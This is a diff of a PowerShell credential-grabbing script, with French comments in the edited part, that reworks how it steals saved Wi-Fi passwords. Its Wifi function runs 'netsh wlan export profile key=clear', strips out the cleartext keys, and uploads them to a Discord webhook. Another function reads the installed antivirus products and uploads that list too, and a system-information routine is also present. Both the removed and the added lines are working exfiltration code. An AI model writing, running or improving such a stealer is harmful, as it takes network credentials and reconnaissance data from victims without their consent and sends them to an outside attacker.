@@ -1,9 +1,7 @@
 $desktop = ([Environment]::GetFolderPath("Desktop"))
 
 function CreateTemp{
-  cd C:\
-  mkdir \temp 
-  cd \temp
+
   }
 
 function Get-Nirsoft {
@@ -15,8 +13,6 @@ function Get-Nirsoft {
 }
 
 function SysInfo {
-#Making sure that my path is on C:\ and creating a \temp folder, then go inside that folder to execute everything
-cd C:\temp
 
 #1. Get User Informations
 # Get the date at the selected format
@@ -79,12 +75,29 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUr
 }
 
 function Wifi {
-New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
-Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
-Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
-Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
-Set-Location -Path "$env:temp"
-Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
+# Crée le dossier temporaire wifi dans C:\temp
+New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
+Set-Location -Path "C:\temp\wifi"
+
+# Exporte les profils Wi-Fi
+netsh wlan export profile key=clear
+
+# Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
+Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
+    $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
+} | Out-File -FilePath "wifi.txt" -Encoding utf8
+
+# Charge le fichier wifi.txt sur Discord
+Upload-Discord -file "wifi.txt" -text "Wifi password :"
+
+# Retourne au dossier temporaire C:\temp
+Set-Location -Path "C:\temp"
+
+# Supprime le dossier temporaire wifi
+Remove-Item -Path "C:\temp\wifi" -Force -Recurse
+
+cd C:\temp
+
 }
 
  function Del-Nirsoft-File {
@@ -93,6 +106,9 @@ Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 }
 
 function version-av {
+  cd C:\
+  mkdir \temp 
+  cd \temp
   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
   Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"
 }
